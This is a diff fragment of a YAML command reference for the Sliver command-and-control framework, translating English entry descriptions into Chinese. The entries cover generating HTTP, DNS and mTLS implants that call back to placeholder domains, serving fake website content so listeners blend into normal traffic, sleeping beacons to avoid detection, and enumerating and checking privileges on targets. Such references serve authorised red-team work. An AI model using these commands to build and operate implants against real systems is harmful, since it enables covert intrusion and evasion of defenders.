+      指定代理 URL 和凭据。
+      格式：proxy=http://proxy:8080&proxy-username=user&proxy-password=pass。
+      仅适用于 Go HTTP 驱动。
     command: "sliver > generate --http {{domain|example.com}}?proxy={{proxy_url|http://proxy:8080}}&proxy-username={{username|user}}&proxy-password={{password|pass}} --save {{output_dir|/tmp}}"
 
-  - title: sliver - generate HTTP with wininet driver (Windows)
+  - title: sliver - 使用 wininet 驱动生成 HTTP（Windows）
     desc: |
-      Generate an HTTP implant using Windows wininet driver. Supports NTLM/Kerberos
-      proxy authentication. Less stable than Go driver but necessary for NTLM/Kerberos.
-      Only works on Windows implants.
+      使用 Windows wininet 驱动生成 HTTP 植入体。
+      支持 NTLM/Kerberos 代理认证。
+      比 Go 驱动稳定性差，但 NTLM/Kerberos 需要它。
+      仅适用于 Windows 植入体。
     command: "sliver > generate --http {{domain|example.com}}?driver=wininet --os windows --save {{output_dir|/tmp}}"
 
-  - title: sliver - generate DNS with advanced options
+  - title: sliver - 使用高级选项生成 DNS
     desc: |
-      Generate a DNS implant with advanced C2 options. Options include: timeout,
-      retry-wait, retry-count, workers-per-resolver, max-errors, force-base32,
-      resolvers, etc. Pass as URL encoded parameters.
+      使用高级 C2 选项生成 DNS 植入体。
+      选项包括：timeout、retry-wait、retry-count、workers-per-resolver、max-errors、force-base32、resolvers 等。
+      以 URL 编码参数形式传递。
     command: "sliver > generate --dns {{fqdn|1.example.com.}}?{{options|timeout=30s&retry-count=3}} --save {{output_dir|/tmp}}"
 
-  - title: sliver - generate DNS with custom resolvers
+  - title: sliver - 使用自定义解析器生成 DNS
     desc: |
-      Generate a DNS implant with custom DNS resolvers. Forces the implant to use
-      specific DNS servers. Multiple resolvers separated by +. Format: resolvers=1.1.1.1+9.9.9.9.
+      使用自定义 DNS 解析器生成 DNS 植入体。
+      强制植入体使用特定 DNS 服务器。
+      多个解析器用 + 分隔。
+      格式：resolvers=1.1.1.1+9.9.9.9。
     command: "sliver > generate --dns {{fqdn|1.example.com.}}?resolvers={{resolvers|1.1.1.1+9.9.9.9}} --save {{output_dir|/tmp}}"
 
   # ============================================================================
   # WEBSITES & STATIC CONTENT
   # ============================================================================
 
-  - title: sliver - add website content
+  - title: sliver - 添加网站内容
     desc: |
-      Add static content to a website. Websites make HTTP(S) listeners look legitimate
-      by serving fake content. Content is key-value pairs of paths and file contents.
-      Useful for blending in with normal web traffic.
+      向网站添加静态内容。
+      网站通过提供虚假内容使 HTTP(S) 监听器看起来合法。
+      内容是路径与文件内容的键值对。
+      用于混入正常 Web 流量。
     command: "sliver > websites --website {{website_name|fake-blog}} --web-path {{path|/}} --content {{content_path|./index.html}} add"
 
-  - title: sliver - list websites
+  - title: sliver - 列出网站
     desc: |
-      List all configured websites. Shows website names and associated content.
-      Websites can be used with HTTP(S) listeners via --website flag.
+      列出所有已配置的网站。
+      显示网站名称和关联内容。
+      网站可通过 --website 标志用于 HTTP(S) 监听器。
     command: "sliver > websites"
 
-  - title: sliver - remove website
+  - title: sliver - 删除网站
     desc: |
-      Remove a website by name. Deletes the website configuration and all its
-      content. Use 'websites' command to see website names.
+      按名称删除网站。
+      删除网站配置及其所有内容。
+      使用 websites 命令查看网站名称。
     command: "sliver > websites --website {{website_name|fake-blog}} rm"
 
   # ============================================================================
   # CANARIES
   # ============================================================================
 
-  - title: sliver - list canaries
+  - title: sliver - 列出金丝雀
     desc: |
-      List all generated canary domains. Canaries are unique per-binary domains
-      that are deliberately not obfuscated. If resolved, indicate the binary
-      was discovered by blue team.
+      列出所有生成的金丝雀域名。
+      金丝雀是每个二进制唯一的域名，故意不混淆。
+      如果被解析，表明该二进制已被蓝队发现。
     command: "sliver > canaries"
 
   # ============================================================================
   # SYSTEM & UTILITIES
   # ============================================================================
 
-  - title: sliver - get system info
+  - title: sliver - 获取系统信息
     desc: |
-      Get detailed system information from the target. Shows OS version, architecture,
-      hostname, username, process information, and more. Useful for initial enumeration.
+      从目标获取详细的系统信息。
+      显示操作系统版本、架构、主机名、用户名、进程信息等。
+      用于初始枚举。
     command: "sliver (SESSION_NAME) > info"
 
-  - title: sliver - check implant privileges
+  - title: sliver - 检查植入体权限
     desc: |
-      Check if the implant is running with elevated privileges. On Windows, checks
-      for Administrator/System privileges. On Unix, checks for root/UID 0.
+      检查植入体是否以提升的权限运行。
+      在 Windows 上检查 Administrator/System 权限。
+      在 Unix 上检查 root/UID 0。
     command: "sliver (SESSION_NAME) > getprivs"
 
-  - title: sliver - sleep implant
+  - title: sliver - 使植入体休眠
     desc: |
-      Put the implant to sleep (beacon mode only). Stops check-ins for the specified
-      duration. Useful for avoiding detection during quiet periods. Format: 30s, 5m, 1h.
+      让植入体休眠（仅限信标模式）。
+      在指定时长内停止签到。
+      用于在安静期避免检测。
+      格式：30s、5m、1h。
     command: "sliver (BEACON_NAME) > sleep {{duration|1h}}"
 
-  - title: sliver - set implant reconnect interval
+  - title: sliver - 设置植入体重连间隔
     desc: |
-      Set the reconnect interval for session mode implants. How long to wait between
-      reconnection attempts if connection is lost. Default is 60s. Format: 30s, 5m.
+      为会话模式植入体设置重连间隔。
+      连接丢失后两次重连尝试之间等待的时长。
+      默认为 60 秒。格式：30s、5m。
     command: "sliver > generate --mtls {{domain|example.com}} --reconnect {{interval|30s}} --save {{output_dir|/tmp}}"
 
-  - title: sliver - set max connection errors
+  - title: sliver - 设置最大连接错误数
     desc: |
-      Set maximum connection errors before implant terminates. After this many
-      consecutive connection failures, the implant will exit. Default is 1000.
-      Useful for limiting retry attempts.
+      设置植入体终止前的最大连接错误数。
+      连续连接失败达到此数量后，植入体将退出。
+      默认为 1000。
+      用于限制重试次数。
     command: "sliver > generate --mtls {{domain|example.com}} --max-errors {{max|100}} --save {{output_dir|/tmp}}"
 
-  - title: sliver - kill session
+  - title: sliver - 终止会话
     desc: |
-      Kill an active session. Terminates the implant process on the target. Use
-      with caution as this will disconnect you from the target. The implant will
-      exit and stop running.
+      终止活动会话。
+      终止目标上的植入体进程。
+      请谨慎使用，因为这会断开你与目标的连接。
+      植入体将退出并停止运行。
     command: "sliver (SESSION_NAME) > exit"
 
-  - title: sliver - kill beacon
+  - title: sliver - 终止信标
     desc: |
-      Kill an active beacon. Terminates the beacon process on the target. The beacon
-      will stop checking in and the implant will exit. Use with caution.
+      终止活动信标。
+      终止目标上的信标进程。
+      信标将停止签到，植入体将退出。
+      请谨慎使用。
     command: "sliver (BEACON_NAME) > exit"
 
